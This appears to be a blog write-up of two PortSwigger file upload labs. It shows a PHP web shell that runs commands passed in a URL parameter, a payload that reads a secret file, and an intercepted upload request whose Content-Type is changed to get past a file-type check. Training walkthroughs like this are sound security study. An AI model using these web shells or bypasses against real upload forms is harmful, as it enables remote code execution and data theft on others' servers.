---
title: Portswigger File Upload Labs 1
date: 2026-10-27
categories:
  - [Web, File Upload]
tags:
  - Web
  - Portswigger
cover: /images/russted.jpeg
---

Tackling File Upload Labs from Portswigger

<!-- more -->

---

## Lab: Remote code execution via web shell upload

### Description

>This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's file system.
>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
>You can log in to your own account using the following credentials: `wiener:peter`

### Solve

After logging in , you are allowed to upload an avatar . I uploaded a php file containing `<?php echo system($_GET['command']); ?>` and tried accesing it using a proxy:

![](images/wtgfbb.png)

It executes ... Now to list what is in carlos' home directory:

![](images/efgefwge.png)

There is 2 `secret` files . Opening them gives the text `bDtBoUZLlX0XppxRKSkbwaOIvI9FCLqxbDtBoUZLlX0XppxRKSkbwaOIvI9FCLqx` but as you might have noticed its just `bDtBoUZLlX0XppxRKSkbwaOIvI9FCLqx` twice . I uploaded and fetched another php file containing `<?php echo file_get_contents('/home/carlos/secret'); ?>` 

![](images/wergbge.png)

Submit and solve the lab

## Lab: Web shell upload via Content-Type restriction bypass

### Description

>This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
>You can log in to your own account using the following credentials: `wiener:peter`

### Solve

Logging and trying to upload a php file containing `<?php echo file_get_contents('/home/carlos/secret'); ?>` as an avatar elicits an error `Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.`

Trying again , but this time intercepting the requesting in my proxy to inspect it

```http
POST /my-account/avatar HTTP/2
Host: 0aeb004d03223ea181c225b0004d0038.web-security-academy.net
Cookie: session=Ieb5wTQ4IB97xTyp0bHy9y77061BY978
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: multipart/form-data; boundary=----geckoformboundary7d735aeef08e6b0d3d878ca6b20b944c
Content-Length: 528


------geckoformboundary7d735aeef08e6b0d3d878ca6b20b944c
Content-Disposition: form-data; name="avatar"; filename="image2.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------geckoformboundary7d735aeef08e6b0d3d878ca6b20b944c
Content-Disposition: form-data; name="user"

wiener
------geckoformboundary7d735aeef08e6b0d3d878ca6b20b944c
Content-Disposition: form-data; name="csrf"

OxtqrQi6QCL3wEG0nbBpdTsK9AG32CQM
------geckoformboundary7d735aeef08e6b0d3d878ca6b20b944c--

```

We can see that the site appends a `Content-Type: application/x-php` in the file part of the form. We can change that to `image/jpeg` and send the request.

This time we get a `The file avatars/image2.php has been uploaded.` instead of an error.

Navigating to where the file is at:

![](images/rwerwerwe.png)

